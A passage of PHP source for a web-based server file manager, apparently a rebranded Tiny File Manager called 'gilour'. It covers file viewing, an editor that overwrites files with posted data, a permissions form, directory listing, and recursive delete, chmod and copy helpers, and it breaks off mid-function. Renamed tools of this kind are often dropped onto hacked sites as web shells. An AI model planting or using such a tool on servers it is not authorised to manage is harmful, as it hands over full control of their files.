                    if (empty($ext) || in_array(strtolower($file), fm_get_text_names()) || preg_match('#\.min\.(css|js)$#i', $file)) {
                        $hljs_class = 'nohighlight';
                    }
                    $content = '<pre class="with-hljs"><code class="' . $hljs_class . '">' . fanco($content) . '</code></pre>';
                } elseif (in_array($ext, array('php', 'php4', 'php5', 'phtml', 'phps'))) {
                    // php highlight
                    $content = highlight_string($content, true);
                } else {
                    $content = '<pre>' . fanco($content) . '</pre>';
                }
                echo $content;
            }
            ?>
        </div>
    </div>
    <?php
        fm_show_footer();
    exit;
}

// file editor
if (isset($_GET['edit']) and !FM_READONLY) {
    $file = $_GET['edit'];
    $file = fm_clean_path($file, false);
    $file = str_replace('/', '', $file);
    if ($file == '' || !is_file($path . '/' . $file) || !fm_is_exclude_items($file)) {
        fm_set_msg(lng('File not found'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }
    $editFile = ' : <i><b>'. $file. '</b></i>';
    header('X-XSS-Protection:0');
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file);
    $file_path = $path . '/' . $file;

    // normal editer
    $isNormalEditor = true;
    if (isset($_GET['env'])) {
        if ($_GET['env'] == "ace") {
            $isNormalEditor = false;
        }
    }

    // Save File
    if (isset($_POST['savedata'])) {
        $writedata = $_POST['savedata'];
        $fd = fopen($file_path, "w");
        @fwrite($fd, $writedata);
        fclose($fd);
        fm_set_msg(lng('File Saved Successfully'));
    }

    $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $mime_type = fm_get_mime_type($file_path);
    $filesize = filesize($file_path);
    $is_text = false;
    $content = ''; // for text

    if (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == 'text' || in_array($mime_type, fm_get_text_mimes())) {
        $is_text = true;
        $content = file_get_contents($file_path);
    }

    ?>
    <div class="path">
        <div class="row">
            <div class="col-xs-12 col-sm-5 col-lg-6 pt-1">
                <div class="btn-toolbar" role="toolbar">
                    <?php if (!$isNormalEditor) { ?>
                        <div class="btn-group js-ace-toolbar">
                            <button data-cmd="none" data-option="fullscreen" class="btn btn-sm btn-outline-secondary" id="js-ace-fullscreen" title="<?php echo lng('Fullscreen') ?>"><i class="fa fa-expand" title="<?php echo lng('Fullscreen') ?>"></i></button>
                            <button data-cmd="find" class="btn btn-sm btn-outline-secondary" id="js-ace-search" title="<?php echo lng('Search') ?>"><i class="fa fa-search" title="<?php echo lng('Search') ?>"></i></button>
                            <button data-cmd="undo" class="btn btn-sm btn-outline-secondary" id="js-ace-undo" title="<?php echo lng('Undo') ?>"><i class="fa fa-undo" title="<?php echo lng('Undo') ?>"></i></button>
                            <button data-cmd="redo" class="btn btn-sm btn-outline-secondary" id="js-ace-redo" title="<?php echo lng('Redo') ?>"><i class="fa fa-repeat" title="<?php echo lng('Redo') ?>"></i></button>
                            <button data-cmd="none" data-option="wrap" class="btn btn-sm btn-outline-secondary" id="js-ace-wordWrap" title="<?php echo lng('Word Wrap') ?>"><i class="fa fa-text-width" title="<?php echo lng('Word Wrap') ?>"></i></button>
                            <select id="js-ace-mode" data-type="mode" title="<?php echo lng('Select Document Type') ?>" class="btn-outline-secondary border-start-0 d-none d-md-block"><option>-- <?php echo lng('Select Mode') ?> --</option></select>
                            <select id="js-ace-theme" data-type="theme" title="<?php echo lng('Select Theme') ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php echo lng('Select Theme') ?> --</option></select>
                            <select id="js-ace-fontSize" data-type="fontSize" title="<?php echo lng('Select Font Size') ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php echo lng('Select Font Size') ?> --</option></select>
                        </div>
                    <?php } ?>
                </div>
            </div>
            <div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-end pt-1">
                <a title="<?php echo lng('Back') ?>" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;view=<?php echo urlencode($file) ?>"><i class="fa fa-reply-all"></i> <?php echo lng('Back') ?></a>
                <a title="<?php echo lng('BackUp') ?>" class="btn btn-sm btn-outline-primary" href="javascript:void(0);" onclick="backup('<?php echo urlencode(trim(FM_PATH)) ?>','<?php echo urlencode($file) ?>')"><i class="fa fa-database"></i> <?php echo lng('BackUp') ?></a>
                <?php if ($is_text) { ?>
                    <?php if ($isNormalEditor) { ?>
                        <a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>&amp;env=ace"><i class="fa fa-pencil-square-o"></i> <?php echo lng('AdvancedEditor') ?></a>
                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fanco($file_url) ?>" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save
                        </button>
                    <?php } else { ?>
                        <a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>"><i class="fa fa-text-height"></i> <?php echo lng('NormalEditor') ?></a>
                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fanco($file_url) ?>" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php echo lng('Save') ?>
                        </button>
                    <?php } ?>
                <?php } ?>
            </div>
        </div>
        <?php
        if ($is_text and $isNormalEditor) {
            echo '<textarea class="mt-2" id="normal-editor" rows="33" cols="120" style="width: 99.5%;">' . htmlspecialchars($content) . '</textarea>';
            echo '<script>document.addEventListener("keydown", function(e) {if ((window.navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)  and e.keyCode == 83) { e.preventDefault();edit_save(this,"nrl");}}, false);</script>';
        } elseif ($is_text) {
            echo '<div id="editor" contenteditable="true">' . htmlspecialchars($content) . '</div>';
        } else {
            fm_set_msg(lng('FILE EXTENSION HAS NOT SUPPORTED'), 'error');
        }
        ?>
    </div>
    <?php
    fm_show_footer();
    exit;
}

if (isset($_GET['chmod']) and !FM_READONLY and !FM_IS_WIN) {
    $file = $_GET['chmod'];
    $file = fm_clean_path($file);
    $file = str_replace('/', '', $file);
    if ($file == '' || (!is_file($path . '/' . $file) and !is_dir($path . '/' . $file))) {
        fm_set_msg(lng('File not found'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $file_url = FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file;
    $file_path = $path . '/' . $file;

    $mode = fileperms($path . '/' . $file);
    ?>
    <div class="path">
        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
            <h6 class="card-header">
                <?php echo lng('ChangePermissions') ?>
            </h6>
            <div class="card-body">
                <p class="card-text">
                    <?php $display_path = fm_get_display_path($file_path); ?>
                    <?php echo $display_path['label']; ?>: <?php echo $display_path['path']; ?><br>
                </p>
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php echo fanco(FM_PATH) ?>">
                    <input type="hidden" name="chmod" value="<?php echo fanco($file) ?>">

                    <table class="table compact-table <?php echo fm_get_theme(); ?>">
                        <tr>
                            <td></td>
                            <td><b><?php echo lng('Owner') ?></b></td>
                            <td><b><?php echo lng('Group') ?></b></td>
                            <td><b><?php echo lng('Other') ?></b></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo lng('Read') ?></b></td>
                            <td><label><input type="checkbox" name="ur" value="1"<?php echo ($mode & 00400) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gr" value="1"<?php echo ($mode & 00040) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="or" value="1"<?php echo ($mode & 00004) ? ' checked' : '' ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo lng('Write') ?></b></td>
                            <td><label><input type="checkbox" name="uw" value="1"<?php echo ($mode & 00200) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gw" value="1"<?php echo ($mode & 00020) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="ow" value="1"<?php echo ($mode & 00002) ? ' checked' : '' ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo lng('Execute') ?></b></td>
                            <td><label><input type="checkbox" name="ux" value="1"<?php echo ($mode & 00100) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gx" value="1"<?php echo ($mode & 00010) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="ox" value="1"<?php echo ($mode & 00001) ? ' checked' : '' ?>></label></td>
                        </tr>
                    </table>

                    <p>
                       <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>"> 
                        <b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></a></b>&nbsp;
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('Change') ?></button>
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php
    fm_show_footer();
    exit;
}

fm_show_header(); // HEADER
fm_show_nav_path(FM_PATH); // current path

fm_show_message();

$num_files = count($files);
$num_folders = count($folders);
$all_files_size = 0;
$tableTheme = (FM_THEME == "dark") ? "text-white bg-dark table-dark" : "bg-white";
?>
<form action="" method="post" class="pt-3">
    <input type="hidden" name="p" value="<?php echo fanco(FM_PATH) ?>">
    <input type="hidden" name="group" value="1">
    <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
    <div class="table-responsive">
        <table class="table table-bordered table-hover table-sm <?php echo $tableTheme; ?>" id="main-table">
            <thead class="thead-white">
            <tr>
                <?php if (!FM_READONLY): ?>
                    <th style="width:3%" class="custom-checkbox-header">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="js-select-all-items" onclick="checkbox_toggle()">
                            <label class="custom-control-label" for="js-select-all-items"></label>
                        </div>
                    </th><?php endif; ?>
                <th><?php echo lng('Name') ?></th>
                <th><?php echo lng('Size') ?></th>
                <th><?php echo lng('Modified') ?></th>
                <?php if (!FM_IS_WIN and !$hide_Cols): ?>
                    <th><?php echo lng('Perms') ?></th>
                    <th><?php echo lng('Owner') ?></th><?php endif; ?>
                <th><?php echo lng('Actions') ?></th>
            </tr>
            </thead>
            <?php
            if ($parent !== false) {
                ?>
                <tr><?php if (!FM_READONLY): ?>
                    <td class="nosort"></td><?php endif; ?>
                    <td class="border-0" data-sort><a href="?p=<?php echo urlencode($parent) ?>"><i class="fa fa-chevron-circle-left go-back"></i> ..</a></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0"></td>
                    <?php if (!FM_IS_WIN and !$hide_Cols) { ?>
                        <td class="border-0"></td>
                        <td class="border-0"></td>
                    <?php } ?>
                </tr>
                <?php
            }
            $uu = 3399;
            foreach ($folders as $f) {
                $is_link = is_link($path . '/' . $f);
                $img = $is_link ? 'icon-link_folder' : 'fa fa-folder-o';
                $modif_raw = filemtime($path . '/' . $f);
                $modif = date(FM_DATETIME_FORMAT, $modif_raw);
                $date_sorting = strtotime(date("F d Y H:i:s.", $modif_raw));
                $filesize_raw = "";
                $filesize = lng('Folder');
                $perms = substr(decoct(fileperms($path . '/' . $f)), -4);
                if (function_exists('posix_getpwuid') and function_exists('posix_getgrgid')) {
                    $owner = posix_getpwuid(fileowner($path . '/' . $f));
                    $group = posix_getgrgid(filegroup($path . '/' . $f));
                    if ($owner === false) {
                        $owner = array('name' => '?');
                    }
                    if ($group === false) {
                        $group = array('name' => '?');
                    }
                } else {
                    $owner = array('name' => '?');
                    $group = array('name' => '?');
                }
                ?>
                <tr>
                    <?php if (!FM_READONLY): ?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php echo $uu ?>" name="file[]" value="<?php echo fanco($f) ?>">
                            <label class="custom-control-label" for="<?php echo $uu ?>"></label>
                        </div>
                        </td><?php endif; ?>
                    <td data-sort=<?php echo fm_convert_win(fanco($f)) ?>>
                        <div class="filename"><a href="?p=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i class="<?php echo $img ?>"></i> <?php echo fm_convert_win(fanco($f)) ?>
                            </a><?php echo($is_link ? ' &rarr; <i>' . readlink($path . '/' . $f) . '</i>' : '') ?></div>
                    </td>
                    <td data-order="a-<?php echo str_pad($filesize_raw, 18, "0", STR_PAD_LEFT);?>">
                        <?php echo $filesize; ?>
                    </td>
                    <td data-order="a-<?php echo $date_sorting;?>"><?php echo $modif ?></td>
                    <?php if (!FM_IS_WIN and !$hide_Cols): ?>
                        <td><?php if (!FM_READONLY): ?><a title="Change Permissions" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a><?php else: ?><?php echo $perms ?><?php endif; ?>
                        </td>
                        <td><?php echo $owner['name'] . ':' . $group['name'] ?></td>
                    <?php endif; ?>
                    <td class="inline-actions"><?php if (!FM_READONLY): ?>
                            <a title="<?php echo lng('Delete')?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($f) ?>" onclick="confirmDailog(event, '1028','<?php echo lng('Delete').' '.lng('Folder'); ?>','<?php echo urlencode($f) ?>', this.href);"> <i class="fa fa-trash-o" aria-hidden="true"></i></a>
                            <a title="<?php echo lng('Rename')?>" href="#" onclick="rename('<?php echo fanco(addslashes(FM_PATH)) ?>', '<?php echo fanco(addslashes($f)) ?>');return false;"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>
                            <a title="<?php echo lng('CopyTo')?>..." href="?p=&amp;copy=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i class="fa fa-files-o" aria-hidden="true"></i></a>
                        <?php endif; ?>
                        <a title="<?php echo lng('DirectLink')?>" href="<?php echo fanco(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f . '/') ?>" target="_blank"><i class="fa fa-link" aria-hidden="true"></i></a>
                    </td>
                </tr>
                <?php
                flush();
                $uu++;
            }
            $ik = 6070;
            foreach ($files as $f) {
                $is_link = is_link($path . '/' . $f);
                $img = $is_link ? 'fa fa-file-text-o' : fm_get_file_icon_class($path . '/' . $f);
                $modif_raw = filemtime($path . '/' . $f);
                $modif = date(FM_DATETIME_FORMAT, $modif_raw);
                $date_sorting = strtotime(date("F d Y H:i:s.", $modif_raw));
                $filesize_raw = fm_get_size($path . '/' . $f);
                $filesize = fm_get_filesize($filesize_raw);
                $filelink = '?p=' . urlencode(FM_PATH) . '&amp;view=' . urlencode($f);
                $all_files_size += $filesize_raw;
                $perms = substr(decoct(fileperms($path . '/' . $f)), -4);
                if (function_exists('posix_getpwuid') and function_exists('posix_getgrgid')) {
                    $owner = posix_getpwuid(fileowner($path . '/' . $f));
                    $group = posix_getgrgid(filegroup($path . '/' . $f));
                    if ($owner === false) {
                        $owner = array('name' => '?');
                    }
                    if ($group === false) {
                        $group = array('name' => '?');
                    }
                } else {
                    $owner = array('name' => '?');
                    $group = array('name' => '?');
                }
                ?>
                <tr>
                    <?php if (!FM_READONLY): ?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php echo $ik ?>" name="file[]" value="<?php echo fanco($f) ?>">
                            <label class="custom-control-label" for="<?php echo $ik ?>"></label>
                        </div>
                        </td><?php endif; ?>
                    <td data-sort=<?php echo fanco($f) ?>>
                        <div class="filename">
                        <?php
                           if (in_array(strtolower(pathinfo($f, PATHINFO_EXTENSION)), array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))): ?>
                                <?php $imagePreview = fanco(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f); ?>
                                <a href="<?php echo $filelink ?>" data-preview-image="<?php echo $imagePreview ?>" title="<?php echo fanco($f) ?>">
                           <?php else: ?>
                                <a href="<?php echo $filelink ?>" title="<?php echo $f ?>">
                            <?php endif; ?>
                                    <i class="<?php echo $img ?>"></i> <?php echo fm_convert_win(fanco($f)) ?>
                                </a>
                                <?php echo($is_link ? ' &rarr; <i>' . readlink($path . '/' . $f) . '</i>' : '') ?>
                        </div>
                    </td>
                    <td data-order="b-<?php echo str_pad($filesize_raw, 18, "0", STR_PAD_LEFT); ?>"><span title="<?php printf('%s bytes', $filesize_raw) ?>">
                        <?php echo $filesize; ?>
                        </span></td>
                    <td data-order="b-<?php echo $date_sorting;?>"><?php echo $modif ?></td>
                    <?php if (!FM_IS_WIN and !$hide_Cols): ?>
                        <td><?php if (!FM_READONLY): ?><a title="<?php echo 'Change Permissions' ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a><?php else: ?><?php echo $perms ?><?php endif; ?>
                        </td>
                        <td><?php echo fanco($owner['name'] . ':' . $group['name']) ?></td>
                    <?php endif; ?>
                    <td class="inline-actions">
                        <?php if (!FM_READONLY): ?>
                            <a title="<?php echo lng('Delete') ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($f) ?>" onclick="confirmDailog(event, 1209, '<?php echo lng('Delete').' '.lng('File'); ?>','<?php echo urlencode($f); ?>', this.href);"> <i class="fa fa-trash-o"></i></a>
                            <a title="<?php echo lng('Rename') ?>" href="#" onclick="rename('<?php echo fanco(addslashes(FM_PATH)) ?>', '<?php echo fanco(addslashes($f)) ?>');return false;"><i class="fa fa-pencil-square-o"></i></a>
                            <a title="<?php echo lng('CopyTo') ?>..."
                               href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i class="fa fa-files-o"></i></a>
                        <?php endif; ?>
                        <a title="<?php echo lng('DirectLink') ?>" href="<?php echo fanco(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f) ?>" target="_blank"><i class="fa fa-link"></i></a>
                        <a title="<?php echo lng('Download') ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;dl=<?php echo urlencode($f) ?>" onclick="confirmDailog(event, 1211, '<?php echo lng('Download'); ?>','<?php echo urlencode($f); ?>', this.href);"><i class="fa fa-download"></i></a>
                    </td>
                </tr>
                <?php
                flush();
                $ik++;
            }

            if (empty($folders) and empty($files)) { ?>
                <tfoot>
                    <tr><?php if (!FM_READONLY): ?>
                            <td></td><?php endif; ?>
                        <td colspan="<?php echo (!FM_IS_WIN and !$hide_Cols) ? '6' : '4' ?>"><em><?php echo lng('Folder is empty') ?></em></td>
                    </tr>
                </tfoot>
                <?php
            } else { ?>
                <tfoot>
                    <tr>
                        <td class="gray" colspan="<?php echo (!FM_IS_WIN and !$hide_Cols) ? (FM_READONLY ? '6' :'7') : (FM_READONLY ? '4' : '5') ?>">
                            <?php echo lng('FullSize').': <span class="badge text-bg-light border-radius-0">'.fm_get_filesize($all_files_size).'</span>' ?>
                            <?php echo lng('File').': <span class="badge text-bg-light border-radius-0">'.$num_files.'</span>' ?>
                            <?php echo lng('Folder').': <span class="badge text-bg-light border-radius-0">'.$num_folders.'</span>' ?>
                        </td>
                    </tr>
                </tfoot>
                <?php } ?>
        </table>
    </div>

    <div class="row">
        <?php if (!FM_READONLY): ?>
        <div class="col-xs-12 col-sm-9">
            <ul class="list-inline footer-action">
                <li class="list-inline-item"> <a href="#/select-all" class="btn btn-small btn-outline-primary btn-2" onclick="select_all();return false;"><i class="fa fa-check-square"></i> <?php echo lng('SelectAll') ?> </a></li>
                <li class="list-inline-item"><a href="#/unselect-all" class="btn btn-small btn-outline-primary btn-2" onclick="unselect_all();return false;"><i class="fa fa-window-close"></i> <?php echo lng('UnSelectAll') ?> </a></li>
                <li class="list-inline-item"><a href="#/invert-all" class="btn btn-small btn-outline-primary btn-2" onclick="invert_all();return false;"><i class="fa fa-th-list"></i> <?php echo lng('InvertSelection') ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('<?php echo lng('Delete selected files and folders?'); ?>')">
                    <a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-trash"></i> <?php echo lng('Delete') ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="zip" id="a-zip" value="zip" onclick="return confirm('<?php echo lng('Create archive?'); ?>')">
                    <a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php echo lng('Zip') ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="tar" id="a-tar" value="tar" onclick="return confirm('<?php echo lng('Create archive?'); ?>')">
                    <a href="javascript:document.getElementById('a-tar').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php echo lng('Tar') ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
                    <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> <?php echo lng('Copy') ?> </a></li>
            </ul>
        </div>
        <div class="col-3 d-none d-sm-block"><a href="." target="_blank" class="float-right text-muted">gilour <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="." target="_blank" class="float-right text-muted">gilour <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>

<?php
fm_show_footer();


function print_external($key) {
    global $external;

    if(!array_key_exists($key, $external)) {
        // throw new Exception('Key missing in external: ' . key);
        echo "<!-- EXTERNAL: MISSING KEY $key -->";
        return;
    }

    echo "$external[$key]";
}


function verifyToken($token) 
{
    if (hash_equals($_SESSION['token'], $token)) { 
        return true;
    }
    return false;
}

/**
 * Delete  file or folder (recursively)
 * @param string $path
 * @return bool
 */
function fm_rdelete($path)
{
    if (is_link($path)) {
        return unlink($path);
    } elseif (is_dir($path)) {
        $objects = scandir($path);
        $ok = true;
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' and $file != '..') {
                    if (!fm_rdelete($path . '/' . $file)) {
                        $ok = false;
                    }
                }
            }
        }
        return ($ok) ? rmdir($path) : false;
    } elseif (is_file($path)) {
        return unlink($path);
    }
    return false;
}


function fm_rchmod($path, $filemode, $dirmode)
{
    if (is_dir($path)) {
        if (!chmod($path, $dirmode)) {
            return false;
        }
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' and $file != '..') {
                    if (!fm_rchmod($path . '/' . $file, $filemode, $dirmode)) {
                        return false;
                    }
                }
            }
        }
        return true;
    } elseif (is_link($path)) {
        return true;
    } elseif (is_file($path)) {
        return chmod($path, $filemode);
    }
    return false;
}


function fm_is_valid_ext($filename)
{
    $allowed = (FM_FILE_EXTENSION) ? explode(',', FM_FILE_EXTENSION) : false;

    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;

    return ($isFileAllowed) ? true : false;
}


function fm_rename($old, $new)
{
    $isFileAllowed = fm_is_valid_ext($new);

    if(!is_dir($old)) {
        if (!$isFileAllowed) return false;
    }

    return (!file_exists($new) and file_exists($old)) ? rename($old, $new) : null;
}


function fm_rcopy($path, $dest, $upd = true, $force = true)
{
    if (is_dir($path)) {
        if (!fm_mkdir($dest, $force)) {
            return false;
        }
        $objects = scandir($path);
        $ok = true;
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' and $file != '..') {
                    if (!fm_rcopy($path . '/' . $file, $dest . '/' . $file)) {
                        $ok = false;
                    }
                }
            }
        }
        return $ok;
    } elseif (is_file($path)) {
        return fm_copy($path, $dest, $upd);
    }
    return false;
}


function fm_mkdir($dir, $force)
{
    if (file_exists($dir)) {
        if (is_dir($dir)) {
            return $dir;
        } elseif (!$force) {
            return false;
        }
        unlink($dir);
    }
    return mkdir($dir, 0777, true);
}


function fm_copy($f1, $f2, $upd)
{
    $time1 = filemtime($f1);
    if (file_exists($f2)) {
        $time2 = filemtime($f2);
        if ($time2 >= $time1 and $upd) {
            return false;
        }
    }
    $ok = copy($f1, $f2);
    if ($ok) {
        touch($f2, $time1);
    }
    return $ok;
}


function fm_get_mime_type($file_path)
{
    if (function_exists('finfo_open')) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $file_path);
        finfo_close($finfo);
        return $mime;
    } elseif (function_exists('mime_content_type')) {
        return mime_content_type($file_path);
    } elseif (!stristr(ini_get('disable_functions'), 'shell_exec')) {
        $file = escapeshellarg($file_path);
        $mime = shell_exec('file -bi ' . $file);
        return $mime;
    } else {
        return '--';
    }
}


function fm_redirect($url, $code = 302)
{
    header('Location: ' . $url, true, $code);
    exit;
}


function get_absolute_path($path) {
    $path = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
    $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), 'strlen');
    $absolutes = array();
    foreach ($parts as $part) {
        if ('.' == $part) continue;
        if ('..' == $part) {
            array_pop($absolutes);
        } else {
            $absolutes[] = $part;
        }
    }
    return implode(DIRECTORY_SEPARATOR, $absolutes);
}


function fm_clean_path($path, $trim = true)
{
    $path = $trim ? trim($path) : $path;
    $path = trim($path, '\\/');
    $path = str_replace(array('../', '..\\'), '', $path);
    $path =  get_absolute_path($path);
    if ($path == '..') {
        $path = '';
    }
    return str_replace('\\', '/', $path);
}


function fm_get_parent_path($path)
{
    $path = fm_clean_path($path);
    if ($path != '') {
        $array = explode('/', $path);
        if (count($array) > 1) {
            $array = array_slice($array, 0, -1);
            return implode('/', $array);
        }
        return '';
    }
    return false;
}

function fm_get_display_path($file_path)
{
    global $path_display_mode, $root_path, $root_url;
    switch ($path_display_mode) {
        case 'relative':
            return array(
                'label' => 'Path',
                'path' => fanco(fm_convert_win(str_replace($root_path, '', $file_path)))
            );
        case 'host':
            $relative_path = str_replace($root_path, '', $file_path);
            return array(
                'label' => 'Host Path',
                'path' => fanco(fm_convert_win('/' . $root_url . '/' . ltrim(str_replace('\\', '/', $relative_path), '/')))
            );
        case 'full':
        default:
            return array(
                'label' => 'Full Path',
                'path' => fanco(fm_convert_win($file_path))
            );
    }
}


function fm_is_exclude_items($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    if (isset($exclude_items) and sizeof($exclude_items)) {
        unset($exclude_items);
    }

    $exclude_items = FM_EXCLUDE_ITEMS;
    if (version_compare(PHP_VERSION, '7.0.0', '<')) {
        $exclude_items = unserialize($exclude_items);
    }
    if (!in_array($file, $exclude_items) and !in_array("*.$ext", $exclude_items)) {
        return true;
    }
    return false;
}


function fm_get_translations($tr) {
    try {
        $content = @file_get_contents('translation.json');
        if($content !== FALSE) {
            $lng = json_decode($content, TRUE);
            global $lang_list;
            foreach ($lng["language"] as $key => $value)
            {
                $code = $value["code"];
                $lang_list[$code] = $value["name"];
                if ($tr)
                    $tr[$code] = $value["translation"];
            }
            return $tr;
        }

    }
    catch (Exception $e) {
        echo $e;
    }
}


function fm_get_size($file)
{
    static $iswin;
    static $isdarwin;
    if (!isset($iswin)) {
        $iswin = (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN');
    }
    if (!isset($isdarwin)) {
        $isdarwin = (strtoupper(substr(PHP_OS, 0)) == "DARWIN");
    }

    static $exec_works;
    if (!isset($exec_works)) {
        $exec_works = (function_exists('exec') and !ini_get('safe_mode') and @exec('echo EXEC') == 'EXEC');
    }

    // try a shell command
    if ($exec_works) {
        $arg = escapeshellarg($file);
        $cmd = ($iswin) ? "for %F in (\"$file\") do @echo %~zF" : ($isdarwin ? "stat -f%z $arg" : "stat -c%s $arg");
        @exec($cmd, $output);
        if (is_array($output) and ctype_digit($size = trim(implode("\n", $output)))) {
            return $size;
        }
    }

    // try the Windows COM interface
    if ($iswin and class_exists("COM")) {
        try {
            $fsobj = new COM('Scripting.FileSystemObject');
            $f = $fsobj->GetFile( realpath($file) );
            $size = $f->Size;
        } catch (Exception $e) {
            $size = null;
        }
        if (ctype_digit($size)) {
            return $size;
        }
    }

    // if all else fails
    return filesize($file);
}


function fm_get_filesize($size)
{
    $size = (float) $size;
    $units = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    $power = ($size > 0) ? floor(log($size, 1024)) : 0;
    $power = ($power > (count($units) - 1)) ? (count($units) - 1) : $power;
    return sprintf('%s %s', round($size / pow(1024, $power), 2), $units[$power]);
}


function fm_get_directorysize($directory) {
    $bytes = 0;
    $directory = realpath($directory);
    if ($directory !== false and $directory != '' and file_exists($directory)){
        foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory, FilesystemIterator::SKIP_DOTS)) as $file){
            $bytes += $file->getSize();
        }
    }
    return $bytes;
}


function fm_get_zif_info($path, $ext) {
    if ($ext == 'zip' and function_exists('zip_open')) {
        $arch = @zip_open($path);
        if ($arch) {
            $filenames = array();
            while ($zip_entry = @zip_read($arch)) {
                $zip_name = @zip_entry_name($zip_entry);
                $zip_folder = substr($zip_name, -1) == '/';
                $filenames[] = array(
                    'name' => $zip_name,
                    'filesize' => @zip_entry_filesize($zip_entry),
                    'compressed_size' => @zip_entry_compressedsize($zip_entry),
                    'folder' => $zip_folder
                );
            }
            @zip_close($arch);
            return $filenames;
        }
